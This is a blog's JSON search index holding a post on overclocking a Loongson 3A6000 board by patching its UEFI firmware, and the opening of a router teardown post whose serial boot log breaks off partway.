{"categories":[{"title":"ctf","uri":"https://naivekun.com/categories/ctf/"},{"title":"HackTheBox","uri":"https://naivekun.com/categories/hackthebox/"},{"title":"vulnhub","uri":"https://naivekun.com/categories/vulnhub/"}],"posts":[{"content":" 最近这个3A6000比较火，买了一个发现性能还不错\n  华硕有一个主板支持超频，性能也能提升不少，但是暂时买不到：https://www.bilibili.com/video/BV15u4y1A7aK\n 研究一下 串口 第一件事，接串口。这个板子UEFI会打印比较完整的log，输出在前面板的RS232串口上\n有了\n哪里设置的频率呢？ 看手册 https://www.loongson.cn/uploads/images/2023112818504442157.Loongson3A6000%20user%20book_V1.0.pdf\n可以看到cpu clock是从main clock分频出来的，那么我们要改main clock\n找到寄存器表\n按这个算频率\n我们先看看它怎么算出来原生的2.5Ghz的，只需要确定这三个参数\n逆一下固件 根据串口log输出的信息\nCPU CLK SEL : 00000002\rMEM CLK SEL : 00000014\rHT CLK SEL : 00000010\rChange the scale of HT0 clock\rDisable HT1/HT2/HT3 clock\rChange the scale of HT1 clock\rSoft CLK SEL adjust begin\r 搜字符串，定位到PreSecMain模块里\n捞出来塞进ghidra里\n右下角这坨就是在写0x01b0配置时钟，左上角这坨tX寄存器操作ghidra没有识别出来，需要手工跟一下\n继续往前跟，发现它是这个逻辑\n 从eFUSE里读板卡类型，读到是3A6000-HV，跳第一个switch-case t2寄存器写入2500 算出寄存器各个参数，拼成0x01b0寄存器 写进去  所以我们把\n LAB_ram_1c000a38 XREF[2]: ram:1c0009f0 (j) , ram:1c000a00 (j) ram:1c000a38 0e 10 a7 03 ori t2,zero ,0x9c4\rram:1c000a3c 00 1c 00 50 b LAB_ram_1c000a58\r 这里改成ori t2, zero, \u0026lt;freq_mhz\u0026gt; 就可以改成任意频率了\n这里提供个汇编脚本\n#!/bin/bash\ropcode32() {\recho $* \u0026gt; tmp.S \u0026amp;\u0026amp; ./loongarch64-linux-gnu-gcc -c tmp.S -o tmp.o \u0026amp;\u0026amp; ./loongarch64-linux-gnu-objdump -d tmp.o\rrm -f tmp.o tmp.S\r}\r 改到2600mhz，看一下汇编长啥样\n所以只要把原来的0e 10 a7 03改成0e a0 a8 03就行了\n改完是不行的，因为这个main clock被太多东西用了，需要合理分频后才能用，参考手册\n这个满足\n这个是不满足的。我们看一下这个HT怎么分的频\n可以看到这个HT分频写了个0xb进去\n0xb就是1011，即开启分频，频率为main_freq*(0b11+1)/8就是main_freq/2，本来2.5G主频的时候/2正好是1.25G，但是我们改高了之后这个HT Freq就超过1.25G了，所以这里我们要改一下分频让它小点\n不妨改成1010，即开启分频，频率为main_freq*(0b10+1)/8就是main_freq*3/8，975Mhz\n所以这里我们也要改一下\n改成lu12i.w a1, 0xb000000\n然后替换hex\n重打包 龙芯这个UEFI非常阳间，不搞骚操作，uefitool直接rebuild就行\n插电，开机  屏幕轻松点亮\n 但是lscpu显示有毛病，BogoMIPS是对的，频率字符串也是对的，但是Max Freq是错的\n不管了，跑个分，确实有提升\n直接读寄存器算出来也是对的\n","id":0,"section":"posts","summary":"最近这个3A6000比较火，买了一个发现性能还不错 华硕有一个主板支持超频，性能也能提升不少，但是暂时买不到：https://www.bili","tags":null,"title":"Loongson 3A6000官方EVB超频","uri":"https://naivekun.com/2023/12/loongson-3a6000-overclock/","year":"2023"},{"content":" 貌似高通的QSDK默认都有这个安全问题\n 背景 最近发现一个便宜路由器Spectrum SAX1V1K，配置挺高的，只要200 RMB\n IPQ8072A + QCN5054 + QCN5024 4x4 WiFi 6 2G RAM 16G emmc 3x 1Gbps RJ45 1x 2.5Gbps RJ45  FCC上有拆机图 https://fccid.io/H8NSAX1V1K/Internal-Photos/Internal-Photos-4757296\nopenwrt forum有讨论帖 https://forum.openwrt.org/t/spectrum-sax1v1k-askey-rt5010w-openwrt-support/149923/121\n到手，草怎么不能刷机 原装固件极其难用，要下个APP配置。拆机，接串口看看\nFormat: Log Type - Time(microsec) - Message - Optional Info\rLog Type: B - Since Boot(Power On Reset), D - Delta, S - Statistic\rS - QC_IMAGE_VERSION_STRING=BOOT.BF.3.3.1-00163\rS - IMAGE_VARIANT_STRING=HAASANAZA\rS - OEM_IMAGE_VERSION_STRING=CRM\rS - Boot Config, 0x000002e3\rB - 202 - PBL, Start\rB - 2739 - bootable_media_detect_entry, Start\rB - 88728 - bootable_media_detect_success, Start\rB - 88732 - elf_loader_entry, Start\rB - 90157 - auth_hash_seg_entry, Start\rB - 128232 - auth_hash_seg_exit, Start\rB - 142789 - elf_segs_hash_verify_entry, Start\rB - 205423 - PBL, End\rB - 220606 - SBL1, Start\rB - 273432 - GCC [RstStat:0x10, RstDbg:0x600000] WDog Stat : 0x4\rB - 279990 - pm_device_init, Start\rB - 409127 - PM_SET_VAL:Skip\rD - 128618 - pm_device_init, Delta\rB - 411536 - pm_driver_init, Start\rD - 5215 - pm_driver_init, Delta\rB - 417758 - clock_init, Start\rD - 2135 - clock_init, Delta\rB - 421906 - boot_flash_init, Start\rD - 7869 - boot_flash_init, Delta\rB - 433466 - boot_config_data_table_init, Start\rD - 1067 - boot_config_data_table_init, Delta - (575 Bytes)\rB - 441091 - Boot Setting : 0x00000618\rB - 444842 - CDT version:2,Platform ID:8,Major ID:117,Minor ID:1,Subtype:6\rB - 451918 - sbl1_ddr_set_params, Start\rB - 455761 - CPR configuration: 0x30c\rB - 459116 - cpr_init, Start\rB - 461983 - Rail:0 Mode: 5 Voltage: 808000\rB - 467107 - CL CPR settled at 760000mV\rB - 470035 - Rail:1 Mode: 5 Voltage: 880000\rB - 474214 - Rail:1 Mode: 7 Voltage: 920000\rD - 16531 - cpr_init, Delta\rB - 481015 - Pre_DDR_clock_init, Start\rB - 485102 - Pre_DDR_clock_init, End\rB - 488427 - DDR Type : PCDDR4\rB - 495259 - do ddr sanity test, Start\rD - 1037 - do ddr sanity test, Delta\rB - 498858 - DDR: Start of HAL DDR Boot Training\rB - 503585 - DDR: End of HAL DDR Boot Training\rB - 509380 - DDR: Checksum to be stored on flash is -1525685476\rB - 519781 - Image Load, Start\rD - 344955 - QSEE Image Loaded, Delta - (1380440 Bytes)\rB - 864827 - Image Load, Start\rD - 457 - SEC Image Loaded, Delta - (0 Bytes)\rB - 872330 - Image Load, Start\rD - 287859 - DEVCFG Image Loaded, Delta - (32468 Bytes)\rB - 1160281 - Image Load, Start\rD - 292861 - RPM Image Loaded, Delta - (93060 Bytes)\rB - 1453233 - Image Load, Start\rD - 312595 - APPSBL Image Loaded, Delta - (617384 Bytes)\rB - 1765950 - QSEE Execution, Start\rD - 61 - QSEE Execution, Delta\rB - 1771745 - USB D+ check, Start\rD - 0 - USB D+ check, Delta\rB - 1778150 - SBL1, End\rD - 1559831 - SBL1, Delta\rS - Flash Throughput, 34403 KB/s (2124599 Bytes, 61756 us)\rS - DDR Frequency, 600 MHz\rS - Core 0 Frequency, 1651 MHz\rU-Boot 1.3.3 [spf11.1_csu2] (Apr 22 2021 - 18:02:25 +0800)\rDRAM: smem ram ptable found: ver: 1 len: 4\r2 GiB\r[Askey] Led init ...\rNAND: Could not find nand_gpio in dts, using defaults\rNot an ONFI device\rONFI probe failed\rID = ffffffff\rVendor = ff\rDevice = ff\rqpic_nand: unknown NAND device manufacturer: ff device: ff\rU-Boot BUG at drivers/mtd/mtdcore.c:420!\rSF: Unsupported flash IDs: manuf ff, jedec ffff, ext_jedec ffff\ripq_spi: SPI Flash not found (bus/cs/speed/mode) = (0/0/48000000/0)\r0 MiB\rMMC: \u0026lt;NULL\u0026gt;: 0 (eMMC)\rIn: serial@78B3000\rOut: serial@78B3000\rErr: serial@78B3000\rmachid: 8750106\reth5 MAC Address from ART is not valid\rHit space key to stop autoboot: 0 [Askey] do_bootaskey()\rcheck temperature of soc 36 ,and threshold 80\r[Askey] thermal_check_temp pass\rmmc:mmcargs=mmc_mid=15\r[Askey] do_boot_signedimg_askey()\rdebug cert - not found\rverify init: active_part [0], bak_part [1]\rverify FW [0] start\rdo verify start\rverify kernel start\rMMC read: dev # 0, block # 35362, count 16384 ... 16384 blocks read: OK\rqca_verify.c [29] load_addr:0x44000000 size:0x800000\rKernel image authentication success verify rootfs start\rMMC read: dev # 0, block # 68130, count 64809 ... 64809 blocks read: OK\rqca_verify.c [57] load_addr:0x41000000 size:0x1fa6928\rRootfs image authentication success do verify success\rverify FW [0] success\rbackup start ...\rMMC read: dev # 0, block # 51746, count 16384 ... 16384 blocks read: OK\rno need backup, FW \u0026amp; FW_1 is same.\rsecure boot fuse is enabled\r## Loading kernel from FIT Image at 44000028 ...\rUsing 'config@rt5010w-d187-rev6' configuration\rTrying 'kernel@1' kernel subimage\rDescription: ARM64 OpenWrt Linux-4.4.60\rType: Kernel Image\rCompression: gzip compressed\rData Start: 0x44000110\rData Size: 3989414 Bytes = 3.8 MiB\rArchitecture: AArch64\rOS: Linux\rLoad Address: 0x41080000\rEntry Point: 0x41080000\rHash algo: crc32\rHash value: 42372119\rHash algo: sha1\rHash value: e9dfebf3bd70909a5490b9b1e24d570415bb70bc\rVerifying Hash Integrity ... crc32+ sha1+ OK\r## Loading fdt from FIT Image at 44000028 ...\rUsing 'config@rt5010w-d187-rev6' configuration\rTrying 'fdt@rt5010w-d187-rev6' fdt subimage\rDescription: ARM64 OpenWrt rt5010w-d187 device tree blob\rType: Flat Device Tree\rCompression: uncompressed\rData Start: 0x44433a0c\rData Size: 82580 Bytes = 80.6 KiB\rArchitecture: AArch64\rHash algo: crc32\rHash value: 80b58082\rHash algo: sha1\rHash value: 8a27020c37af23b6f83437f66ee6957fe764db2a\rVerifying Hash Integrity ... crc32+ sha1+ OK\rBooting using the fdt blob at 0x44433a0c\rUncompressing Kernel Image ... OK\rLoading Device Tree to 4a1e8000, end 4a1ff293 ... OK\rUsing machid 0x8750106 from environment\rStarting kernel ...\rJumping to AARCH64 kernel via monitor\r[ 0.000000] Booting Linux on physical CPU 0x0\r[ 0.000000] Initializing cgroup subsys cpuset\r[ 0.000000] Initializing cgroup subsys cpu\r[ 0.000000] Initializing cgroup subsys cpuacct\r[ 0.000000] Linux version 4.4.60 (jenkins@ip-47-228-8-81) (gcc version 5.2.0 (OpenWrt GCC 5.2.0 49a007675+r49254) ) #1 SMP PREEMPT Mon Oct 11 18:15:52 UTC 2021\r[ 0.000000] Boot CPU: AArch64 Processor [410fd034]\r[ 0.000000] Ignoring memory range 0x40000000 - 0x41000000\r[ 0.000000] Machine: Askey RT5010W-D187/REV6\r[ 0.000000] efi: Getting EFI parameters from FDT:\r[ 0.000000] efi: UEFI not found.\r[ 0.000000] Reserved memory: OVERLAP DETECTED!\r[ 0.000000] wifi_dump@51100000 (0x0000000051100000--0x0000000051700000) overlaps with wigig_dump@51300000 (0x0000000051300000--0x0000000051700000)\r[ 0.000000] psci: probing for conduit method from DT.\r[ 0.000000] psci: PSCIv1.0 detected in firmware.\r[ 0.000000] psci: Using standard PSCI v0.2 function IDs\r[ 0.000000] psci: MIGRATE_INFO_TYPE not supported.\r[ 0.000000] PERCPU: Embedded 15 pages/cpu @ffffffc07ef4a000 s20864 r8192 d32384 u61440\r[ 0.000000] Detected VIPT I-cache on CPU0\r[ 0.000000] CPU features: enabling workaround for ARM erratum 845719\r[ 0.000000] Built 1 zonelists in Zone order, mobility grouping on. Total pages: 482112\r[ 0.000000] Kernel command line: console=ttyMSM0,115200n8 mmc_mid=0x15 boot_signedimg root=PARTUUID=3f6c8b45-381d-2e4d-a72c-4a59900be353 gpt uboot-version=1.3.3 rootwait secboot=1 swiotlb=1 coherent_pool=2M\r[ 0.000000] PID hash table entries: 4096 (order: 3, 32768 bytes)\r[ 0.000000] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes)\r[ 0.000000] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes)\r[ 0.000000] software IO TLB [mem 0xbfe02000-0xbfe42000] (0MB) mapped at [ffffffc07ee02000-ffffffc07ee41fff]\r[ 0.000000] Memory: 1914812K/1960960K available (5468K kernel code, 633K rwdata, 2340K rodata, 228K init, 395K bss, 46148K reserved, 0K cma-reserved)\r[ 0.000000] Virtual kernel memory layout:\r[ 0.000000] vmalloc : 0xffffff8000000000 - 0xffffffbdbfff0000 ( 246 GB)\r[ 0.000000] vmemmap : 0xffffffbdc0000000 - 0xffffffbfc0000000 ( 8 GB maximum)\r[ 0.000000] 0xffffffbdc0040000 - 0xffffffbdc2000000 ( 31 MB actual)\r[ 0.000000] fixed : 0xffffffbffa7fd000 - 0xffffffbffac00000 ( 4108 KB)\r[ 0.000000] PCI I/O : 0xffffffbffae00000 - 0xffffffbffbe00000 ( 16 MB)\r[ 0.000000] modules : 0xffffffbffc000000 - 0xffffffc000000000 ( 64 MB)\r[ 0.000000] memory : 0xffffffc000000000 - 0xffffffc07f000000 ( 2032 MB)\r[ 0.000000] .init : 0xffffffc000822000 - 0xffffffc00085b000 ( 228 KB)\r[ 0.000000] .text : 0xffffffc000080000 - 0xffffffc000822000 ( 7816 KB)\r[ 0.000000] .data : 0xffffffc00086a000 - 0xffffffc000908600 ( 634 KB)\r[ 0.000000] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=4, Nodes=1\r[ 0.000000] Preemptible hierarchical RCU implementation.\r[ 0.000000] Build-time adjustment of leaf fanout to 64.\r[ 0.000000] NR_IRQS:64 nr_irqs:64 0\r[ 0.000000] Architected cp15 timer(s) running at 19.20MHz (virt).\r[ 0.000000] clocksource: arch_sys_counter: mask: 0xffffffffffffff max_cycles: 0x46d987e47, max_idle_ns: 440795202767 ns\r[ 0.000005] sched_clock: 56 bits at 19MHz, resolution 52ns, wraps every 4398046511078ns\r[ 0.000417] Calibrating delay loop (skipped), value calculated using timer frequency.. 38.40 BogoMIPS (lpj=192000)\r[ 0.000429] pid_max: default: 32768 minimum: 301\r[ 0.000526] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes)\r[ 0.000537] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes)\r[ 0.001119] Initializing cgroup subsys io\r[ 0.001136] Initializing cgroup subsys memory\r[ 0.001162] Initializing cgroup subsys devices\r[ 0.001174] Initializing cgroup subsys freezer\r[ 0.001186] Initializing cgroup subsys net_cls\r[ 0.001197] Initializing cgroup subsys pids\r[ 0.001445] EFI services will not be available.\r[ 0.001471] ASID allocator initialised with 65536 entries\r[ 0.051949] MSM Memory Dump base table set up\r[ 0.051970] MSM Memory Dump apps data table set up\r[ 0.090102] Detected VIPT I-cache on CPU1\r[ 0.090146] CPU1: Booted secondary processor [410fd034]\r[ 0.120102] Detected VIPT I-cache on CPU2\r[ 0.120133] CPU2: Booted secondary processor [410fd034]\r[ 0.150139] Detected VIPT I-cache on CPU3\r[ 0.150169] CPU3: Booted secondary processor [410fd034]\r[ 0.150233] Brought up 4 CPUs\r[ 0.150260] SMP: Total of 4 processors activated.\r[ 0.150271] CPU: All CPU(s) started at EL1\r[ 0.150299] alternatives: patching kernel code\r[ 0.167093] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604462750000 ns\r[ 0.167121] futex hash table entries: 1024 (order: 5, 131072 bytes)\r[ 0.167513] pinctrl core: initialized pinctrl subsystem\r[ 0.168433] NET: Registered protocol family 16\r[ 0.190084] cpuidle: using governor ladder\r[ 0.220107] cpuidle: using governor menu\r[ 0.220313] NET: Registered protocol family 42\r[ 0.220443] vdso: 2 pages (1 code @ ffffffc000871000, 1 data @ ffffffc000870000)\r[ 0.220473] hw-breakpoint: found 6 breakpoint and 4 watchpoint registers.\r[ 0.221132] DMA: preallocated 2048 KiB pool for atomic allocations\r[ 0.221265] CPU: IPQ8072A, SoC Version: 2.0\r[ 0.221705] IPC logging disabled\r[ 0.221712] IPC logging disabled\r[ 0.221718] IPC logging disabled\r[ 0.221724] IPC logging disabled\r[ 0.221729] IPC logging disabled\r[ 0.224349] Soc version is not 1, changing clock offsets\r[ 0.233146] irq: no irq domain found for /soc/smp2p-wcss/slave-kernel !\r[ 0.235689] irq: no irq domain found for /soc/smp2p-wcss/slave-kernel !\r[ 0.239115] sps:sps is ready.\r[ 0.244165] spmi spmi-0: PMIC Arb Version-2 (0x20010000)\r[ 0.250720] qcom,cpr4-apss-regulator b018000.cpr4-ctrl: CPR valid fuse count: 4\r[ 0.251013] qcom,cpr3-npu-regulator a4000.npu-cpr: NPU CPR valid fuse count: 2\r[ 0.292204] pps_core: LinuxPPS API ver. 1 registered\r[ 0.292213] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti \u0026lt;giometti@linux.it\u0026gt;\r[ 0.292236] PTP clock support registered\r[ 0.293666] Advanced Linux Sound Architecture Driver Initialized.\r[ 0.294365] clocksource: Switched to clocksource arch_sys_counter\r[ 0.297586] NET: Registered protocol family 2\r[ 0.298214] TCP established hash table entries: 16384 (order: 5, 131072 bytes)\r[ 0.298419] TCP bind hash table entries: 16384 (order: 6, 262144 bytes)\r[ 0.298781] TCP: Hash tables configured (established 16384 bind 16384)\r[ 0.298842] UDP hash table entries: 1024 (order: 3, 32768 bytes)\r[ 0.298908] UDP-Lite hash table entries: 1024 (order: 3, 32768 bytes)\r[ 0.299125] NET: Registered protocol family 1\r[ 0.299655] hw perfevents: enabled with armv8_cortex_a53 PMU driver, 7 counters available\r[ 0.307642] squashfs: version 4.0 (2009/01/31) Phillip Lougher\r[ 0.307659] jffs2: version 2.2 (NAND) (SUMMARY) (LZMA) (RTIME) (CMODE_PRIORITY) (c) 2001-2006 Red Hat, Inc.\r[ 0.311359] Key type asymmetric registered\r[ 0.311375] Asymmetric key parser 'x509' registered\r[ 0.311403] io scheduler noop registered\r[ 0.311417] io scheduler deadline registered (default)\r[ 0.318019] msm_rpm_log_probe: OK\r[ 0.318353] msm-dcc b3000.dcc: DCC XPU is not specified\r[ 0.318597] msm-dcc b3000.dcc: jiffies_64: 0xffff8aef, cntvct_64: 0x95db534\r[ 0.318610] msm-dcc b3000.dcc: gcnt_hi: 0x00000000(0xffffff800027e004)\r[ 0.318622] msm-dcc b3000.dcc: gcnt_lo: 0x095db73b(0xffffff800027e000)\r[ 0.319193] TZ SMMU State: SMMU Stage2 Enabled\r[ 0.319249] TZ Log : Will warn on Access Violation, as paniconaccessviolation is not set\r[ 0.320833] msm_serial 78b3000.serial: msm_serial: detected port #0\r[ 0.320876] msm_serial 78b3000.serial: uartclk = 3686400\r[ 0.320913] 78b3000.serial: ttyMSM0 at MMIO 0x78b3000 (irq = 78, base_baud = 230400) is a MSM\r[ 0.320934] msm_serial: console setup on port #0\r[ 1.033593] console [ttyMSM0] enabled\r[ 1.038603] msm_serial: driver initialized\r[ 1.042111] msm_serial_hsl_init: driver initialized\r[ 1.054972] brd: module loaded\r[ 1.055740] spi_qup 78b8000.spi: IN:block:16, fifo:64, OUT:block:16, fifo:64\r[ 1.059042] libphy: Fixed MDIO Bus: probed\r[ 1.504816] qca-mdio 90000.mdio: Could not find phy-reset-gpio\r[ 1.504930] libphy: qca_mdio: probed\r[ 1.511026] qca-mdio 90000.mdio: qca-mdio driver was registered\r[ 1.513459] Unable to create IPC log context!\r[ 1.519224] Skip QCA8074V1 in V2 platform\r[ 1.523666] cnss[2]: INFO: Platform driver probed successfully. plat ffffffc07b830018 tgt 0xfffe\r[ 1.527680] i2c /dev entries driver\r[ 1.543583] device-mapper: ioctl: 4.34.0-ioctl (2015-10-28) initialised: dm-devel@redhat.com\r[ 1.544017] sdhci: Secure Digital Host Controller Interface driver\r[ 1.551148] sdhci: Copyright(c) Pierre Ossman\r[ 1.557113] sdhci-pltfm: SDHCI platform and OF driver helper\r[ 1.561938] mmc:emmc actual mid 0x15 and syscon select node DsLow,syscon\r[ 1.567308] mmc:syscon reg base 0xa000 regval 0x9e5b\r[ 1.573926] qcom_ice_get_pdevice: invalid device list\r[ 1.578881] sdhci_msm 7824900.sdhci: sdhci_msm_ice_get_dev: ICE device not probed yet\r[ 1.583815] sdhci_msm 7824900.sdhci: sdhci_msm_probe: required ICE device not probed yet err = -517\r[ 1.592335] qcom_ice_get_device_tree_data: No vdd-hba-supply regulator, assuming not needed\r[ 1.600567] ICE IRQ = 81\r[ 1.609356] [ 1.609356] Version Rollback Feature Disabled\r[ 1.614147] remoteproc remoteproc0: releasing cd00000.qcom_q6v5_wcss\r[ 1.618533] SPMI VADC - Min ch: 0 Max ch: 15\r[ 1.625551] of_graph_get_next_endpoint(): no port node found in /soc/csr@6001000\r[ 1.628072] coresight-csr 6001000.csr: CSR initialized\r[ 1.635565] of_graph_get_next_endpoint(): no port node found in /soc/cti@6010000\r[ 1.640488] of_graph_get_next_endpoint(): no port node found in /soc/cti@6011000\r[ 1.648058] of_graph_get_next_endpoint(): no port node found in /soc/cti@6012000\r[ 1.655418] of_graph_get_next_endpoint(): no port node found in /soc/cti@6013000\r[ 1.662779] of_graph_get_next_endpoint(): no port node found in /soc/cti@6014000\r[ 1.670170] of_graph_get_next_endpoint(): no port node found in /soc/cti@6015000\r[ 1.677553] of_graph_get_next_endpoint(): no port node found in /soc/cti@6016000\r[ 1.684937] of_graph_get_next_endpoint(): no port node found in /soc/cti@6017000\r[ 1.692290] of_graph_get_next_endpoint(): no port node found in /soc/cti@6018000\r[ 1.699681] of_graph_get_next_endpoint(): no port node found in /soc/cti@6019000\r[ 1.707073] of_graph_get_next_endpoint(): no port node found in /soc/cti@601a000\r[ 1.714441] of_graph_get_next_endpoint(): no port node found in /soc/cti@601b000\r[ 1.721801] of_graph_get_next_endpoint(): no port node found in /soc/cti@601c000\r[ 1.729204] of_graph_get_next_endpoint(): no port node found in /soc/cti@601d000\r[ 1.736576] of_graph_get_next_endpoint(): no port node found in /soc/cti@601e000\r[ 1.743942] of_graph_get_next_endpoint(): no port node found in /soc/cti@601f000\r[ 1.751338] of_graph_get_next_endpoint(): no port node found in /soc/cti@6198000\r[ 1.758727] of_graph_get_next_endpoint(): no port node found in /soc/cti@6199000\r[ 1.766103] of_graph_get_next_endpoint(): no port node found in /soc/cti@619a000\r[ 1.773465] of_graph_get_next_endpoint(): no port node found in /soc/cti@619b000\r[ 1.780870] of_graph_get_next_endpoint(): no port node found in /soc/cti@610c000\r[ 1.788396] sps_register_bam_device : unable to create IPC Logging 0 for bam 0x0000000006044000\r[ 1.795466] sps_register_bam_device : unable to create IPC Logging 1 for bam 0x0000000006044000sps_register_bam_device : unable to create IPC Logging 2 for bam 0x0000000006044000\r[ 1.812561] sps_register_bam_device : unable to create IPC Logging 3 for bam 0x0000000006044000sps_register_bam_device : unable to create IPC Logging 4 for bam 0x0000000006044000\r[ 1.828444] sps:BAM 0x0000000006044000 is registered.[ 1.836193] coresight-tmc 6028000.tmc: TMC initialized\r[ 1.840888] coresight-tmc 6027000.tmc: TMC initialized\r[ 1.846050] coresight-funnel 6021000.funnel: FUNNEL initialized\r[ 1.851063] coresight-funnel 6100000.funnel: FUNNEL initialized\r[ 1.856895] coresight-funnel 6120000.funnel: FUNNEL initialized\r[ 1.862776] coresight-funnel 6130000.funnel: FUNNEL initialized\r[ 1.868722] coresight-funnel 61a1000.funnel: FUNNEL initialized\r[ 1.875093] coresight-etm4x 619c000.etm: ETM 4.0 initialized\r[ 1.880732] coresight-etm4x 619d000.etm: ETM 4.0 initialized\r[ 1.886668] coresight-etm4x 619e000.etm: ETM 4.0 initialized\r[ 1.892288] coresight-etm4x 619f000.etm: ETM 4.0 initialized\r[ 1.897730] coresight-replicator-qcom 6026000.replicator: REPLICATOR 1.0 initialized\r[ 1.903306] ------------[ cut here ]------------\r[ 1.910801] WARNING: at drivers/clk/clk.c:689\r[ 1.915399] Modules linked in:\r[ 1.922595] [ 1.922691] CPU: 0 PID: 1 Comm: swapper/0 Not tainted 4.4.60 #1\r[ 1.924258] Hardware name: Askey RT5010W-D187/REV6 (DT)\r[ 1.929899] task: ffffffc010778000 ti: ffffffc010778000 task.ti: ffffffc010778000\r[ 1.935119] PC is at clk_core_disable+0x98/0xa0\r[ 1.942747] LR is at clk_disable+0x2c/0x44\r[ 1.947084] pc : [\u0026lt;ffffffc0004581ec\u0026gt;] lr : [\u0026lt;ffffffc000459678\u0026gt;] pstate: 60000085\r[ 1.951257] sp : ffffffc010783bd0\r[ 1.958801] x29: ffffffc010783bd0 x28: 0000000000000000 [ 1.967127] x27: ffffffc000854620 x26: ffffffc00084e100 [ 1.972423] x25: 0000000000000000 x24: ffffffc000943000 [ 1.977718] x23: ffffffc0008dbda8 x22: ffffffc0008dbd00 [ 1.983012] x21: ffffffc07bc7ad70 x20: 0000000000000000 [ 1.988308] x19: ffffffc07b973e00 x18: 0000000000000008 [ 1.993603] x17: 0000000000000000 x16: 0000000000000000 [ 1.998898] x15: 0000000000000000 x14: ffffffffffffffff [ 2.004193] x13: 0000000000000010 x12: 0101010101010101 [ 2.009489] x11: 0000000000000001 x10: 0000000000000720 [ 2.014784] x9 : ffffffc010783ab0 x8 : ffffffc010778780 [ 2.020079] x7 : 0000000000000000 x6 : ffffffc07ef4dde8 [ 2.025374] x5 : 0000000000000001 x4 : 0000000000000000 [ 2.030669] x3 : 00000000ffff8b8d x2 : 0000000000000804 [ 2.035964] x1 : 0000000000000001 x0 : ffffffc07bc26a00 [ 2.041258] [ 2.041450] ---[ end trace 2d292889cb4d943b ]---\r[ 2.043005] Call trace:\r[ 2.047606] [\u0026lt;ffffffc0004581ec\u0026gt;] clk_core_disable+0x98/0xa0\r[ 2.049784] [\u0026lt;ffffffc000308288\u0026gt;] amba_put_disable_pclk.isra.4+0x1c/0x38\r[ 2.055337] [\u0026lt;ffffffc00030845c\u0026gt;] amba_probe+0xc0/0x124\r[ 2.061935] [\u0026lt;ffffffc00035710c\u0026gt;] driver_probe_device+0x19c/0x3dc\r[ 2.067145] [\u0026lt;ffffffc0003573b0\u0026gt;] __driver_attach+0x64/0x90\r[ 2.073307] [\u0026lt;ffffffc00035546c\u0026gt;] bus_for_each_dev+0x68/0x98\r[ 2.078601] [\u0026lt;ffffffc000356b34\u0026gt;] driver_attach+0x20/0x28\r[ 2.084070] [\u0026lt;ffffffc000356674\u0026gt;] bus_add_driver+0x130/0x248\r[ 2.089625] [\u0026lt;ffffffc000357c54\u0026gt;] driver_register+0x90/0xdc\r[ 2.094920] [\u0026lt;ffffffc000307e38\u0026gt;] amba_driver_register+0x54/0x5c\r[ 2.100476] [\u0026lt;ffffffc000845628\u0026gt;] stm_init+0x14/0x1c\r[ 2.106292] [\u0026lt;ffffffc000082a18\u0026gt;] do_one_initcall+0x19c/0x1b8\r[ 2.111157] [\u0026lt;ffffffc000822b20\u0026gt;] kernel_init_freeable+0x18c/0x22c\r[ 2.117060] [\u0026lt;ffffffc0005ca13c\u0026gt;] kernel_init+0x10/0xec\r[ 2.123045] [\u0026lt;ffffffc000085d50\u0026gt;] ret_from_fork+0x10/0x40\r[ 2.128167] ------------[ cut here ]------------\r[ 2.133544] WARNING: at drivers/clk/clk.c:581\r[ 2.138142] Modules linked in:\r[ 2.145338] [ 2.145434] CPU: 0 PID: 1 Comm: swapper/0 Tainted: G W 4.4.60 #1\r[ 2.147003] Hardware name: Askey RT5010W-D187/REV6 (DT)\r[ 2.154031] task: ffffffc010778000 ti: ffffffc010778000 task.ti: ffffffc010778000\r[ 2.159074] PC is at clk_core_unprepare+0x78/0x80\r[ 2.166708] LR is at clk_unprepare+0x28/0x3c\r[ 2.171391] pc : [\u0026lt;ffffffc000457dec\u0026gt;] lr : [\u0026lt;ffffffc000458e98\u0026gt;] pstate: 60000005\r[ 2.175737] sp : ffffffc010783bd0\r[ 2.183106] x29: ffffffc010783bd0 x28: 0000000000000000 [ 2.191434] x27: ffffffc000854620 x26: ffffffc00084e100 [ 2.196727] x25: 0000000000000000 x24: ffffffc000943000 [ 2.202023] x23: ffffffc0008dbda8 x22: ffffffc0008dbd00 [ 2.207318] x21: ffffffc07bc7ad70 x20: ffffffc07b973e00 [ 2.212614] x19: ffffffc07b973e00 x18: 0000000000000008 [ 2.217908] x17: 0000000000000000 x16: 0000000000000000 [ 2.223203] x15: 0000000000000000 x14: ffffffffffffffff [ 2.228499] x13: 0000000000000010 x12: 0101010101010101 [ 2.233794] x11: 0000000000000001 x10: 0000000000000720 [ 2.239089] x9 : ffffffc010783b00 x8 : ffffffc010778780 [ 2.244384] x7 : 0000000000000000 x6 : ffffffc07ef4cb80 [ 2.249679] x5 : 0000000000000001 x4 : 0000000000000000 [ 2.254974] x3 : 0000000000000000 x2 : 0000000000000804 [ 2.260269] x1 : 0000000000000001 x0 : ffffffc07bc26a00 [ 2.265563] [ 2.265741] ---[ end trace 2d292889cb4d943c ]---\r[ 2.267310] Call trace:\r[ 2.271911] [\u0026lt;ffffffc000457dec\u0026gt;] clk_core_unprepare+0x78/0x80\r[ 2.274088] [\u0026lt;ffffffc000308290\u0026gt;] amba_put_disable_pclk.isra.4+0x24/0x38\r[ 2.279990] [\u0026lt;ffffffc00030845c\u0026gt;] amba_probe+0xc0/0x124\r[ 2.286415] [\u0026lt;ffffffc00035710c\u0026gt;] driver_probe_device+0x19c/0x3dc\r[ 2.291624] [\u0026lt;ffffffc0003573b0\u0026gt;] __driver_attach+0x64/0x90\r[ 2.297785] [\u0026lt;ffffffc00035546c\u0026gt;] bus_for_each_dev+0x68/0x98\r[ 2.303080] [\u0026lt;ffffffc000356b34\u0026gt;] driver_attach+0x20/0x28\r[ 2.308549] [\u0026lt;ffffffc000356674\u0026gt;] bus_add_driver+0x130/0x248\r[ 2.314104] [\u0026lt;ffffffc000357c54\u0026gt;] driver_register+0x90/0xdc\r[ 2.319398] [\u0026lt;ffffffc000307e38\u0026gt;] amba_driver_register+0x54/0x5c\r[ 2.324955] [\u0026lt;ffffffc000845628\u0026gt;] stm_init+0x14/0x1c\r[ 2.330769] 